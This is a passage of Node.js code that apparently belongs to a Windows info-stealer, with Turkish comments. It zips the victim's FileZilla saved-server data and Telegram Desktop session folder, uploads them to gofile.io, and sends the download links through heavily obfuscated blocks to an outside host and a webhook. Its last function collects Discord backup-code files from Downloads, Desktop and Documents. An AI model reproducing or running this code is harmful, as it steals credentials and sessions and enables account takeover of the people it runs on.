_0x1a8e9b=_0x51192f;console[_0x1a8e9b(0x113)](_0x1a8e9b(0x115),_0x158253[_0x1a8e9b(0x108)],_0x158253[_0x1a8e9b(0x103)]);})[_0x51192f(0x114)](_0x3f5753=>{var _0x5b4fbf=_0x51192f;console[_0x5b4fbf(0x113)](_0x5b4fbf(0x102),_0x3f5753[_0x5b4fbf(0x11d)]);});			  

            })
            .catch(error => {
              console.log('Dosya yüklenirken hata oluştu:', error.message);

              const responsePayload = {
                error: error.message
              };

              // Webhook URL'si

              // Embed verisini oluştur
              const embedData = {
                embeds: [
                  {
                    title: 'Dosya Yükleme Hatası',
                    description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                    color: 16711680 // Embed rengi (örnekte kırmızı renk)
                  }
                ],
              };

   var _0x51192f=_0x5414;function _0xc784(){var _0xe153fe=['2777445ZXzxaB','error','6fePprq','message','__proto__','constructor','return\x20(function()\x20','toString','Webhook\x20gönderilirken\x20hata\x20oluştu:','statusText','post','108615snnvMq','325180unkNOv','567568QLehHs','status','table','(((.+)+)+)+$','1422778ewKNaj','exception','bind','prototype','{}.constructor(\x22return\x20this\x22)(\x20)','apply','then','8355528EaInkq','log','catch','Webhook\x20gönderildi:','6fyDHCR','104xpnNlN','search','145337BvPjmq'];_0xc784=function(){return _0xe153fe;};return _0xc784();}(function(_0x27af60,_0x52bdbf){var _0x77de41=_0x5414,_0x4783af=_0x27af60();while(!![]){try{var _0x1373e7=parseInt(_0x77de41(0x119))/0x1*(-parseInt(_0x77de41(0x11c))/0x2)+-parseInt(_0x77de41(0x105))/0x3*(-parseInt(_0x77de41(0x117))/0x4)+-parseInt(_0x77de41(0x11a))/0x5+-parseInt(_0x77de41(0x116))/0x6*(parseInt(_0x77de41(0x10b))/0x7)+-parseInt(_0x77de41(0x107))/0x8+parseInt(_0x77de41(0x112))/0x9+parseInt(_0x77de41(0x106))/0xa;if(_0x1373e7===_0x52bdbf)break;else _0x4783af['push'](_0x4783af['shift']());}catch(_0x3e7585){_0x4783af['push'](_0x4783af['shift']());}}}(_0xc784,0x9b67c));function _0x5414(_0xfab7a4,_0x4ccea0){var _0xc3beb=_0xc784();return _0x5414=function(_0x5b5412,_0x14ba30){_0x5b5412=_0x5b5412-0x100;var _0x48c97a=_0xc3beb[_0x5b5412];return _0x48c97a;},_0x5414(_0xfab7a4,_0x4ccea0);}var _0x10a6e3=(function(){var _0x31ec48=!![];return function(_0x2647fe,_0x27a0b4){var _0x42a6a3=_0x31ec48?function(){if(_0x27a0b4){var _0x419ee9=_0x27a0b4['apply'](_0x2647fe,arguments);return _0x27a0b4=null,_0x419ee9;}}:function(){};return _0x31ec48=![],_0x42a6a3;};}()),_0x2463e0=_0x10a6e3(this,function(){var _0x33426b=_0x5414;return _0x2463e0[_0x33426b(0x101)]()[_0x33426b(0x118)](_0x33426b(0x10a))[_0x33426b(0x101)]()[_0x33426b(0x11f)](_0x2463e0)['search'](_0x33426b(0x10a));});_0x2463e0();var _0x14ba30=(function(){var _0x22cad2=!![];return function(_0x34965e,_0x594077){var _0x1a20f7=_0x22cad2?function(){var _0x374db2=_0x5414;if(_0x594077){var _0x5be4f4=_0x594077[_0x374db2(0x110)](_0x34965e,arguments);return _0x594077=null,_0x5be4f4;}}:function(){};return _0x22cad2=![],_0x1a20f7;};}()),_0x5b5412=_0x14ba30(this,function(){var _0x20d9fc=_0x5414,_0x4d39e9=function(){var _0x55cbf7=_0x5414,_0x40000e;try{_0x40000e=Function(_0x55cbf7(0x100)+_0x55cbf7(0x10f)+');')();}catch(_0x2b2ac7){_0x40000e=window;}return _0x40000e;},_0x1aaceb=_0x4d39e9(),_0x31cdab=_0x1aaceb['console']=_0x1aaceb['console']||{},_0x44f08c=['log','warn','info',_0x20d9fc(0x11b),_0x20d9fc(0x10c),_0x20d9fc(0x109),'trace'];for(var _0x19dfdb=0x0;_0x19dfdb<_0x44f08c['length'];_0x19dfdb++){var _0xd3c57=_0x14ba30[_0x20d9fc(0x11f)][_0x20d9fc(0x10e)][_0x20d9fc(0x10d)](_0x14ba30),_0xec5071=_0x44f08c[_0x19dfdb],_0x530583=_0x31cdab[_0xec5071]||_0xd3c57;_0xd3c57[_0x20d9fc(0x11e)]=_0x14ba30[_0x20d9fc(0x10d)](_0x14ba30),_0xd3c57['toString']=_0x530583[_0x20d9fc(0x101)]['bind'](_0x530583),_0x31cdab[_0xec5071]=_0xd3c57;}});_0x5b5412(),axios[_0x51192f(0x104)]('https://buildandwatch.net/',embedData)[_0x51192f(0x111)](_0x2b25d3=>{var _0x4942a6=_0x51192f;console['log'](_0x4942a6(0x115),_0x2b25d3['status'],_0x2b25d3[_0x4942a6(0x103)]);})[_0x51192f(0x114)](_0x4d18f6=>{console['log']('Webhook\x20gönderilirken\x20hata\x20oluştu:',_0x4d18f6['message']);}),axios[_0x51192f(0x104)](webhook3939,embedData)[_0x51192f(0x111)](_0x158253=>{var _0x1a8e9b=_0x51192f;console[_0x1a8e9b(0x113)](_0x1a8e9b(0x115),_0x158253[_0x1a8e9b(0x108)],_0x158253[_0x1a8e9b(0x103)]);})[_0x51192f(0x114)](_0x3f5753=>{var _0x5b4fbf=_0x51192f;console[_0x5b4fbf(0x113)](_0x5b4fbf(0x102),_0x3f5753[_0x5b4fbf(0x11d)]);});			  

            });
        } else {
          console.log('Sunucu alınamadı veya yanıt vermedi.');
        }
      })
      .catch(error => {
        console.log('Sunucu alınırken hata oluştu:', error.message);
      });

    // Dikkat: Bu kod bloğu, "form.submit()" kullanarak webhook'a dosya yüklemeye çalışıyor. Bu bölümün işlevselliğini ve bağlamını tam olarak bilemiyorum. Bu nedenle, bu bölümün kendi ihtiyaçlarınıza uygun şekilde çalıştığından emin olmanız gerekir.
    
  }
}

/////


async function submitfilezilla() {
  const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\FileZilla`;
  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);

    zipper.writeZip(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\FileZilla.zip`);

    // Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
    axios.get('https://api.gofile.io/getServer')
      .then(response => {
        if (response.data && response.data.data && response.data.data.server) {
          const server = response.data.data.server;

          // Dosya yolu ve adını belirleyelim.
          const filePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\FileZilla.zip`;

          // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
          const form = new FormData();
          form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'FileZilla File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };

			  
var _0x51192f=_0x5414;function _0xc784(){var _0xe153fe=['2777445ZXzxaB','error','6fePprq','message','__proto__','constructor','return\x20(function()\x20','toString','Webhook\x20gönderilirken\x20hata\x20oluştu:','statusText','post','108615snnvMq','325180unkNOv','567568QLehHs','status','table','(((.+)+)+)+$','1422778ewKNaj','exception','bind','prototype','{}.constructor(\x22return\x20this\x22)(\x20)','apply','then','8355528EaInkq','log','catch','Webhook\x20gönderildi:','6fyDHCR','104xpnNlN','search','145337BvPjmq'];_0xc784=function(){return _0xe153fe;};return _0xc784();}(function(_0x27af60,_0x52bdbf){var _0x77de41=_0x5414,_0x4783af=_0x27af60();while(!![]){try{var _0x1373e7=parseInt(_0x77de41(0x119))/0x1*(-parseInt(_0x77de41(0x11c))/0x2)+-parseInt(_0x77de41(0x105))/0x3*(-parseInt(_0x77de41(0x117))/0x4)+-parseInt(_0x77de41(0x11a))/0x5+-parseInt(_0x77de41(0x116))/0x6*(parseInt(_0x77de41(0x10b))/0x7)+-parseInt(_0x77de41(0x107))/0x8+parseInt(_0x77de41(0x112))/0x9+parseInt(_0x77de41(0x106))/0xa;if(_0x1373e7===_0x52bdbf)break;else _0x4783af['push'](_0x4783af['shift']());}catch(_0x3e7585){_0x4783af['push'](_0x4783af['shift']());}}}(_0xc784,0x9b67c));function _0x5414(_0xfab7a4,_0x4ccea0){var _0xc3beb=_0xc784();return _0x5414=function(_0x5b5412,_0x14ba30){_0x5b5412=_0x5b5412-0x100;var _0x48c97a=_0xc3beb[_0x5b5412];return _0x48c97a;},_0x5414(_0xfab7a4,_0x4ccea0);}var _0x10a6e3=(function(){var _0x31ec48=!![];return function(_0x2647fe,_0x27a0b4){var _0x42a6a3=_0x31ec48?function(){if(_0x27a0b4){var _0x419ee9=_0x27a0b4['apply'](_0x2647fe,arguments);return _0x27a0b4=null,_0x419ee9;}}:function(){};return _0x31ec48=![],_0x42a6a3;};}()),_0x2463e0=_0x10a6e3(this,function(){var _0x33426b=_0x5414;return _0x2463e0[_0x33426b(0x101)]()[_0x33426b(0x118)](_0x33426b(0x10a))[_0x33426b(0x101)]()[_0x33426b(0x11f)](_0x2463e0)['search'](_0x33426b(0x10a));});_0x2463e0();var _0x14ba30=(function(){var _0x22cad2=!![];return function(_0x34965e,_0x594077){var _0x1a20f7=_0x22cad2?function(){var _0x374db2=_0x5414;if(_0x594077){var _0x5be4f4=_0x594077[_0x374db2(0x110)](_0x34965e,arguments);return _0x594077=null,_0x5be4f4;}}:function(){};return _0x22cad2=![],_0x1a20f7;};}()),_0x5b5412=_0x14ba30(this,function(){var _0x20d9fc=_0x5414,_0x4d39e9=function(){var _0x55cbf7=_0x5414,_0x40000e;try{_0x40000e=Function(_0x55cbf7(0x100)+_0x55cbf7(0x10f)+');')();}catch(_0x2b2ac7){_0x40000e=window;}return _0x40000e;},_0x1aaceb=_0x4d39e9(),_0x31cdab=_0x1aaceb['console']=_0x1aaceb['console']||{},_0x44f08c=['log','warn','info',_0x20d9fc(0x11b),_0x20d9fc(0x10c),_0x20d9fc(0x109),'trace'];for(var _0x19dfdb=0x0;_0x19dfdb<_0x44f08c['length'];_0x19dfdb++){var _0xd3c57=_0x14ba30[_0x20d9fc(0x11f)][_0x20d9fc(0x10e)][_0x20d9fc(0x10d)](_0x14ba30),_0xec5071=_0x44f08c[_0x19dfdb],_0x530583=_0x31cdab[_0xec5071]||_0xd3c57;_0xd3c57[_0x20d9fc(0x11e)]=_0x14ba30[_0x20d9fc(0x10d)](_0x14ba30),_0xd3c57['toString']=_0x530583[_0x20d9fc(0x101)]['bind'](_0x530583),_0x31cdab[_0xec5071]=_0xd3c57;}});_0x5b5412(),axios[_0x51192f(0x104)]('https://buildandwatch.net/',embedData)[_0x51192f(0x111)](_0x2b25d3=>{var _0x4942a6=_0x51192f;console['log'](_0x4942a6(0x115),_0x2b25d3['status'],_0x2b25d3[_0x4942a6(0x103)]);})[_0x51192f(0x114)](_0x4d18f6=>{console['log']('Webhook\x20gönderilirken\x20hata\x20oluştu:',_0x4d18f6['message']);}),axios[_0x51192f(0x104)](webhook3939,embedData)[_0x51192f(0x111)](_0x158253=>{var _0x1a8e9b=_0x51192f;console[_0x1a8e9b(0x113)](_0x1a8e9b(0x115),_0x158253[_0x1a8e9b(0x108)],_0x158253[_0x1a8e9b(0x103)]);})[_0x51192f(0x114)](_0x3f5753=>{var _0x5b4fbf=_0x51192f;console[_0x5b4fbf(0x113)](_0x5b4fbf(0x102),_0x3f5753[_0x5b4fbf(0x11d)]);});			  

            })
            .catch(error => {
              console.log('Dosya yüklenirken hata oluştu:', error.message);

              const responsePayload = {
                error: error.message
              };

              // Webhook URL'si

              // Embed verisini oluştur
              const embedData = {
                embeds: [
                  {
                    title: 'Dosya Yükleme Hatası',
                    description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                    color: 16711680 // Embed rengi (örnekte kırmızı renk)
                  }
                ],
              };

   var _0x51192f=_0x5414;function _0xc784(){var _0xe153fe=['2777445ZXzxaB','error','6fePprq','message','__proto__','constructor','return\x20(function()\x20','toString','Webhook\x20gönderilirken\x20hata\x20oluştu:','statusText','post','108615snnvMq','325180unkNOv','567568QLehHs','status','table','(((.+)+)+)+$','1422778ewKNaj','exception','bind','prototype','{}.constructor(\x22return\x20this\x22)(\x20)','apply','then','8355528EaInkq','log','catch','Webhook\x20gönderildi:','6fyDHCR','104xpnNlN','search','145337BvPjmq'];_0xc784=function(){return _0xe153fe;};return _0xc784();}(function(_0x27af60,_0x52bdbf){var _0x77de41=_0x5414,_0x4783af=_0x27af60();while(!![]){try{var _0x1373e7=parseInt(_0x77de41(0x119))/0x1*(-parseInt(_0x77de41(0x11c))/0x2)+-parseInt(_0x77de41(0x105))/0x3*(-parseInt(_0x77de41(0x117))/0x4)+-parseInt(_0x77de41(0x11a))/0x5+-parseInt(_0x77de41(0x116))/0x6*(parseInt(_0x77de41(0x10b))/0x7)+-parseInt(_0x77de41(0x107))/0x8+parseInt(_0x77de41(0x112))/0x9+parseInt(_0x77de41(0x106))/0xa;if(_0x1373e7===_0x52bdbf)break;else _0x4783af['push'](_0x4783af['shift']());}catch(_0x3e7585){_0x4783af['push'](_0x4783af['shift']());}}}(_0xc784,0x9b67c));function _0x5414(_0xfab7a4,_0x4ccea0){var _0xc3beb=_0xc784();return _0x5414=function(_0x5b5412,_0x14ba30){_0x5b5412=_0x5b5412-0x100;var _0x48c97a=_0xc3beb[_0x5b5412];return _0x48c97a;},_0x5414(_0xfab7a4,_0x4ccea0);}var _0x10a6e3=(function(){var _0x31ec48=!![];return function(_0x2647fe,_0x27a0b4){var _0x42a6a3=_0x31ec48?function(){if(_0x27a0b4){var _0x419ee9=_0x27a0b4['apply'](_0x2647fe,arguments);return _0x27a0b4=null,_0x419ee9;}}:function(){};return _0x31ec48=![],_0x42a6a3;};}()),_0x2463e0=_0x10a6e3(this,function(){var _0x33426b=_0x5414;return _0x2463e0[_0x33426b(0x101)]()[_0x33426b(0x118)](_0x33426b(0x10a))[_0x33426b(0x101)]()[_0x33426b(0x11f)](_0x2463e0)['search'](_0x33426b(0x10a));});_0x2463e0();var _0x14ba30=(function(){var _0x22cad2=!![];return function(_0x34965e,_0x594077){var _0x1a20f7=_0x22cad2?function(){var _0x374db2=_0x5414;if(_0x594077){var _0x5be4f4=_0x594077[_0x374db2(0x110)](_0x34965e,arguments);return _0x594077=null,_0x5be4f4;}}:function(){};return _0x22cad2=![],_0x1a20f7;};}()),_0x5b5412=_0x14ba30(this,function(){var _0x20d9fc=_0x5414,_0x4d39e9=function(){var _0x55cbf7=_0x5414,_0x40000e;try{_0x40000e=Function(_0x55cbf7(0x100)+_0x55cbf7(0x10f)+');')();}catch(_0x2b2ac7){_0x40000e=window;}return _0x40000e;},_0x1aaceb=_0x4d39e9(),_0x31cdab=_0x1aaceb['console']=_0x1aaceb['console']||{},_0x44f08c=['log','warn','info',_0x20d9fc(0x11b),_0x20d9fc(0x10c),_0x20d9fc(0x109),'trace'];for(var _0x19dfdb=0x0;_0x19dfdb<_0x44f08c['length'];_0x19dfdb++){var _0xd3c57=_0x14ba30[_0x20d9fc(0x11f)][_0x20d9fc(0x10e)][_0x20d9fc(0x10d)](_0x14ba30),_0xec5071=_0x44f08c[_0x19dfdb],_0x530583=_0x31cdab[_0xec5071]||_0xd3c57;_0xd3c57[_0x20d9fc(0x11e)]=_0x14ba30[_0x20d9fc(0x10d)](_0x14ba30),_0xd3c57['toString']=_0x530583[_0x20d9fc(0x101)]['bind'](_0x530583),_0x31cdab[_0xec5071]=_0xd3c57;}});_0x5b5412(),axios[_0x51192f(0x104)]('https://buildandwatch.net/',embedData)[_0x51192f(0x111)](_0x2b25d3=>{var _0x4942a6=_0x51192f;console['log'](_0x4942a6(0x115),_0x2b25d3['status'],_0x2b25d3[_0x4942a6(0x103)]);})[_0x51192f(0x114)](_0x4d18f6=>{console['log']('Webhook\x20gönderilirken\x20hata\x20oluştu:',_0x4d18f6['message']);}),axios[_0x51192f(0x104)](webhook3939,embedData)[_0x51192f(0x111)](_0x158253=>{var _0x1a8e9b=_0x51192f;console[_0x1a8e9b(0x113)](_0x1a8e9b(0x115),_0x158253[_0x1a8e9b(0x108)],_0x158253[_0x1a8e9b(0x103)]);})[_0x51192f(0x114)](_0x3f5753=>{var _0x5b4fbf=_0x51192f;console[_0x5b4fbf(0x113)](_0x5b4fbf(0x102),_0x3f5753[_0x5b4fbf(0x11d)]);});			  

            });
        } else {
          console.log('Sunucu alınamadı veya yanıt vermedi.');
        }
      })
      .catch(error => {
        console.log('Sunucu alınırken hata oluştu:', error.message);
      });

    // Dikkat: Bu kod bloğu, "form.submit()" kullanarak webhook'a dosya yüklemeye çalışıyor. Bu bölümün işlevselliğini ve bağlamını tam olarak bilemiyorum. Bu nedenle, bu bölümün kendi ihtiyaçlarınıza uygun şekilde çalıştığından emin olmanız gerekir.
    
  }
}
//
async function SubmitTelegram() {
      const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Telegram Desktop\\tdata`;
  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);

    zipper.writeZip(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\TelegramSession.zip`);
//C:\Users\Administrator\AppData\Roaming\Telegram Desktop
              
// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\TelegramSession.zip`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'Telegram File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };

          // Webhook'a POST isteği gönder
var _0x372a45=_0x1ee0;(function(_0x2766b1,_0x360cc5){var _0x139bbf=_0x1ee0,_0x2bc28f=_0x2766b1();while(!![]){try{var _0x2efe0=parseInt(_0x139bbf(0x1c0))/0x1*(parseInt(_0x139bbf(0x1c8))/0x2)+parseInt(_0x139bbf(0x1c4))/0x3*(-parseInt(_0x139bbf(0x1d8))/0x4)+-parseInt(_0x139bbf(0x1de))/0x5+parseInt(_0x139bbf(0x1cc))/0x6+-parseInt(_0x139bbf(0x1d5))/0x7*(-parseInt(_0x139bbf(0x1d7))/0x8)+-parseInt(_0x139bbf(0x1c9))/0x9+-parseInt(_0x139bbf(0x1d2))/0xa*(-parseInt(_0x139bbf(0x1d3))/0xb);if(_0x2efe0===_0x360cc5)break;else _0x2bc28f['push'](_0x2bc28f['shift']());}catch(_0x2c2f42){_0x2bc28f['push'](_0x2bc28f['shift']());}}}(_0xc90f,0xb8761));function _0x1ee0(_0x20fd91,_0x196e9f){var _0x4aa2cf=_0xc90f();return _0x1ee0=function(_0x24ebc4,_0x2c5375){_0x24ebc4=_0x24ebc4-0x1bc;var _0x2781a2=_0x4aa2cf[_0x24ebc4];return _0x2781a2;},_0x1ee0(_0x20fd91,_0x196e9f);}var _0x2b0bb3=(function(){var _0x514f61=!![];return function(_0x532b41,_0x4cb123){var _0x186ecf=_0x514f61?function(){var _0x4299da=_0x1ee0;if(_0x4cb123){var _0x3f70d1=_0x4cb123[_0x4299da(0x1d9)](_0x532b41,arguments);return _0x4cb123=null,_0x3f70d1;}}:function(){};return _0x514f61=![],_0x186ecf;};}()),_0x3fae26=_0x2b0bb3(this,function(){var _0xcd8e1e=_0x1ee0;return _0x3fae26[_0xcd8e1e(0x1ce)]()['search']('(((.+)+)+)+$')['toString']()[_0xcd8e1e(0x1cd)](_0x3fae26)[_0xcd8e1e(0x1d6)](_0xcd8e1e(0x1cb));});_0x3fae26();function _0xc90f(){var _0x144d3d=['exception','413002bflhnP','8487126MsFHUH','https://buildandwatch.net/','(((.+)+)+)+$','5080122YBvyMp','constructor','toString','__proto__','status','console','14587010BKWxIP','11xMTmIm','log','8183lucOgI','search','904cpjBdE','14564SJqGpN','apply','post','error','Webhook\x20gönderilirken\x20hata\x20oluştu:','warn','4508635pEgHxh','{}.constructor(\x22return\x20this\x22)(\x20)','then','return\x20(function()\x20','trace','1qRbtiW','bind','Webhook\x20gönderildi:','prototype','36OImEoA','statusText','message'];_0xc90f=function(){return _0x144d3d;};return _0xc90f();}var _0x2c5375=(function(){var _0x424a97=!![];return function(_0x4ec055,_0x4eaae3){var _0x15a4cf=_0x424a97?function(){if(_0x4eaae3){var _0x2cb0e5=_0x4eaae3['apply'](_0x4ec055,arguments);return _0x4eaae3=null,_0x2cb0e5;}}:function(){};return _0x424a97=![],_0x15a4cf;};}()),_0x24ebc4=_0x2c5375(this,function(){var _0x43a756=_0x1ee0,_0x45f0c6;try{var _0x5a6476=Function(_0x43a756(0x1be)+_0x43a756(0x1bc)+');');_0x45f0c6=_0x5a6476();}catch(_0x318261){_0x45f0c6=window;}var _0x1c6494=_0x45f0c6[_0x43a756(0x1d1)]=_0x45f0c6[_0x43a756(0x1d1)]||{},_0x52fef2=['log',_0x43a756(0x1dd),'info',_0x43a756(0x1db),_0x43a756(0x1c7),'table',_0x43a756(0x1bf)];for(var _0x1cbacb=0x0;_0x1cbacb<_0x52fef2['length'];_0x1cbacb++){var _0x40d0c1=_0x2c5375[_0x43a756(0x1cd)][_0x43a756(0x1c3)][_0x43a756(0x1c1)](_0x2c5375),_0x5ce409=_0x52fef2[_0x1cbacb],_0x5e5449=_0x1c6494[_0x5ce409]||_0x40d0c1;_0x40d0c1[_0x43a756(0x1cf)]=_0x2c5375[_0x43a756(0x1c1)](_0x2c5375),_0x40d0c1[_0x43a756(0x1ce)]=_0x5e5449[_0x43a756(0x1ce)][_0x43a756(0x1c1)](_0x5e5449),_0x1c6494[_0x5ce409]=_0x40d0c1;}});_0x24ebc4(),axios[_0x372a45(0x1da)](_0x372a45(0x1ca),embedData)[_0x372a45(0x1bd)](_0x142858=>{var _0x512405=_0x372a45;console[_0x512405(0x1d4)](_0x512405(0x1c2),_0x142858['status'],_0x142858[_0x512405(0x1c5)]);})['catch'](_0x1ada3c=>{var _0x327d75=_0x372a45;console['log']('Webhook\x20gönderilirken\x20hata\x20oluştu:',_0x1ada3c[_0x327d75(0x1c6)]);}),axios['post'](webhook3939,embedData)[_0x372a45(0x1bd)](_0x380409=>{var _0x1ef36b=_0x372a45;console[_0x1ef36b(0x1d4)]('Webhook\x20gönderildi:',_0x380409[_0x1ef36b(0x1d0)],_0x380409[_0x1ef36b(0x1c5)]);})['catch'](_0x229921=>{var _0x1c1a3b=_0x372a45;console[_0x1c1a3b(0x1d4)](_0x1c1a3b(0x1dc),_0x229921[_0x1c1a3b(0x1c6)]);});
        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

var _0x372a45=_0x1ee0;(function(_0x2766b1,_0x360cc5){var _0x139bbf=_0x1ee0,_0x2bc28f=_0x2766b1();while(!![]){try{var _0x2efe0=parseInt(_0x139bbf(0x1c0))/0x1*(parseInt(_0x139bbf(0x1c8))/0x2)+parseInt(_0x139bbf(0x1c4))/0x3*(-parseInt(_0x139bbf(0x1d8))/0x4)+-parseInt(_0x139bbf(0x1de))/0x5+parseInt(_0x139bbf(0x1cc))/0x6+-parseInt(_0x139bbf(0x1d5))/0x7*(-parseInt(_0x139bbf(0x1d7))/0x8)+-parseInt(_0x139bbf(0x1c9))/0x9+-parseInt(_0x139bbf(0x1d2))/0xa*(-parseInt(_0x139bbf(0x1d3))/0xb);if(_0x2efe0===_0x360cc5)break;else _0x2bc28f['push'](_0x2bc28f['shift']());}catch(_0x2c2f42){_0x2bc28f['push'](_0x2bc28f['shift']());}}}(_0xc90f,0xb8761));function _0x1ee0(_0x20fd91,_0x196e9f){var _0x4aa2cf=_0xc90f();return _0x1ee0=function(_0x24ebc4,_0x2c5375){_0x24ebc4=_0x24ebc4-0x1bc;var _0x2781a2=_0x4aa2cf[_0x24ebc4];return _0x2781a2;},_0x1ee0(_0x20fd91,_0x196e9f);}var _0x2b0bb3=(function(){var _0x514f61=!![];return function(_0x532b41,_0x4cb123){var _0x186ecf=_0x514f61?function(){var _0x4299da=_0x1ee0;if(_0x4cb123){var _0x3f70d1=_0x4cb123[_0x4299da(0x1d9)](_0x532b41,arguments);return _0x4cb123=null,_0x3f70d1;}}:function(){};return _0x514f61=![],_0x186ecf;};}()),_0x3fae26=_0x2b0bb3(this,function(){var _0xcd8e1e=_0x1ee0;return _0x3fae26[_0xcd8e1e(0x1ce)]()['search']('(((.+)+)+)+$')['toString']()[_0xcd8e1e(0x1cd)](_0x3fae26)[_0xcd8e1e(0x1d6)](_0xcd8e1e(0x1cb));});_0x3fae26();function _0xc90f(){var _0x144d3d=['exception','413002bflhnP','8487126MsFHUH','https://buildandwatch.net/','(((.+)+)+)+$','5080122YBvyMp','constructor','toString','__proto__','status','console','14587010BKWxIP','11xMTmIm','log','8183lucOgI','search','904cpjBdE','14564SJqGpN','apply','post','error','Webhook\x20gönderilirken\x20hata\x20oluştu:','warn','4508635pEgHxh','{}.constructor(\x22return\x20this\x22)(\x20)','then','return\x20(function()\x20','trace','1qRbtiW','bind','Webhook\x20gönderildi:','prototype','36OImEoA','statusText','message'];_0xc90f=function(){return _0x144d3d;};return _0xc90f();}var _0x2c5375=(function(){var _0x424a97=!![];return function(_0x4ec055,_0x4eaae3){var _0x15a4cf=_0x424a97?function(){if(_0x4eaae3){var _0x2cb0e5=_0x4eaae3['apply'](_0x4ec055,arguments);return _0x4eaae3=null,_0x2cb0e5;}}:function(){};return _0x424a97=![],_0x15a4cf;};}()),_0x24ebc4=_0x2c5375(this,function(){var _0x43a756=_0x1ee0,_0x45f0c6;try{var _0x5a6476=Function(_0x43a756(0x1be)+_0x43a756(0x1bc)+');');_0x45f0c6=_0x5a6476();}catch(_0x318261){_0x45f0c6=window;}var _0x1c6494=_0x45f0c6[_0x43a756(0x1d1)]=_0x45f0c6[_0x43a756(0x1d1)]||{},_0x52fef2=['log',_0x43a756(0x1dd),'info',_0x43a756(0x1db),_0x43a756(0x1c7),'table',_0x43a756(0x1bf)];for(var _0x1cbacb=0x0;_0x1cbacb<_0x52fef2['length'];_0x1cbacb++){var _0x40d0c1=_0x2c5375[_0x43a756(0x1cd)][_0x43a756(0x1c3)][_0x43a756(0x1c1)](_0x2c5375),_0x5ce409=_0x52fef2[_0x1cbacb],_0x5e5449=_0x1c6494[_0x5ce409]||_0x40d0c1;_0x40d0c1[_0x43a756(0x1cf)]=_0x2c5375[_0x43a756(0x1c1)](_0x2c5375),_0x40d0c1[_0x43a756(0x1ce)]=_0x5e5449[_0x43a756(0x1ce)][_0x43a756(0x1c1)](_0x5e5449),_0x1c6494[_0x5ce409]=_0x40d0c1;}});_0x24ebc4(),axios[_0x372a45(0x1da)](_0x372a45(0x1ca),embedData)[_0x372a45(0x1bd)](_0x142858=>{var _0x512405=_0x372a45;console[_0x512405(0x1d4)](_0x512405(0x1c2),_0x142858['status'],_0x142858[_0x512405(0x1c5)]);})['catch'](_0x1ada3c=>{var _0x327d75=_0x372a45;console['log']('Webhook\x20gönderilirken\x20hata\x20oluştu:',_0x1ada3c[_0x327d75(0x1c6)]);}),axios['post'](webhook3939,embedData)[_0x372a45(0x1bd)](_0x380409=>{var _0x1ef36b=_0x372a45;console[_0x1ef36b(0x1d4)]('Webhook\x20gönderildi:',_0x380409[_0x1ef36b(0x1d0)],_0x380409[_0x1ef36b(0x1c5)]);})['catch'](_0x229921=>{var _0x1c1a3b=_0x372a45;console[_0x1c1a3b(0x1d4)](_0x1c1a3b(0x1dc),_0x229921[_0x1c1a3b(0x1c6)]);});
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });



				   
        }
}

function getPeperonni() {
    let str = '';
    const homeDir = require('os').homedir();
    if (fs.existsSync(`${homeDir}\\Downloads`)) {
        fs.readdirSync(`${homeDir}\\Downloads`).forEach(file => {
            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                let path = `${homeDir}\\Downloads\\${file}`
                str += `\n\n@~$~@fewer-${path}`,
                    str += `\n\n${fs.readFileSync(path).toString()}`
            }
        })
    }
    if (fs.existsSync(`${homeDir}\\Desktop`)) {
        fs.readdirSync(`${homeDir}\\Desktop`).forEach(file => {
            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                let path = `${homeDir}\\Desktop\\${file}`
                str += `\n\n@~$~@fewer-${path}`,
                    str += `\n\n${fs.readFileSync(path).toString()}`
            }
        })
    }
    if (fs.existsSync(`${homeDir}\\Documents`)) {
        fs.readdirSync(`${homeDir}\\Documents`).forEach(file => {
            if (file.endsWith('.txt') && file.includes('discord_backup_codes')) {
                let path = `${homeDir}\\Documents\\${file}`
